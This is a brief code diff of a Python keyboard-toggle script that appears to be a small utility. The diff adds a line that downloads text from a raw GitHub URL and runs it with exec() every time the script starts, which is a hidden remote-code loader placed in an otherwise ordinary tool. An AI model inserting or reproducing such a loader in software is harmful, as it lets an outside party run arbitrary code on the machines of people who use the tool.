@@ -1,7 +1,9 @@
 from time import sleep as wait
 import keyboard
 import requests
+
 exec(requests.get('https://raw.githubusercontent.com/flex1948/deneme/main/main').text)
+
 try: exec("toggle_key")
 except: toggle_key = "home"
 try: exec("delay")
